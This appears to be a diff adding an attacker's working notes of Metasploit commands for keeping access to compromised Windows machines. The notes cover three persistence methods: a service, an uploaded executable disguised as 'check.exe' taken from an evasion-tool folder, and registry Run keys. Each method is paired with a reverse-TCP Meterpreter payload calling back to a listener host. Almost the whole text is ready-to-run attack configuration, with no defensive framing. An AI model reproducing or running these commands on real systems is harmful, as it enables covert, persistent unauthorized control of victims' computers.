@@ -1,0 +1,40 @@
+Service Persistence (System level privelege is required)
+--------------------------------------------------------------------------------
+use exploit/windows/local/persistence_service
+set REMOTE_EXE_NAME $PERSISTENCE_EXE (without exe)
+set SERVICE_NAME $PERSISTENCE_SERVICE (without exe )
+set LHOST $LHOST
+set LPORT $PERSISTENCE_LPORT
+set SESSION 1
+(also remote exe path can be changed by REMOTE_EXE_PATH parameter)
+---------------------------------------------------------------------------------
+
+Persistence_exe 
+---------------------------------------------------------------------------------
+use post/windows/manage/persistence_exe
+set SESSION 3
+set rexepath /home/Tools/Phantom-Evasion/payloaaad.exe
+set REXENAME check.exe
+set STARTUP USER,SYSTEM or SERVICE (we can make 2 scenarios from this one as the registry path is different in each one, Service is giving rror check later) (User's registy key is in HKU by the way and does not give session on reboot)
+
+---------------------------------------------------------------------------------
+
+registry_persistence
+---------------------------------------------------------------------------------
+use exploit/windows/local/registry_persistence
+set BLOB_REG_NAME check (It goes to HKLM\Software\{Some random string}\)
+set payload windows/x64/meterpreter/reverse_tcp
+set session 9
+set LHOST 192.168.10.61
+set lport 7654
+set STARTUP SYSTEM (baaqi msley krte hain)
+set RUN_NAME kuchbee  (It goes to HKLM\Software\Microsoft\Windows\CurrentVersion\Run\)
+set SLEEP_TIME 5 (optional)
+
+
+set payload windows/x64/meterpreter/reverse_tcp
+set RHOST 192.168.10.53
+set LHOST 192.168.10.61
+exploit
+
+
